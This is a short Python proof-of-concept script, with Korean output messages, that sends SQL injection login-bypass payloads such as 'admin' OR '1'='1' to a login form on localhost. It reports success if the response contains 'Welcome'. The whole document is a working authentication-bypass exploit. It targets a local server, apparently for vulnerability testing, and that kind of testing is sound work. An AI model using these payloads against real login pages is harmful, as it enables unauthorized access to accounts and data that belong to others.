import requests

url = "http://localhost:3000/login"

payload = {"username": "admin' OR '1'='1", "password": "pw"}
payload = {"username": "1'= '' OR '1' = '1'--", "password": ""}

res = requests.post(url, data=payload)

if "Welcome" in res.text:
    print("[+] PoC 성공: SQL Injection 존재!")
else:
    print("[-] PoC 실패: 취약점 없음")
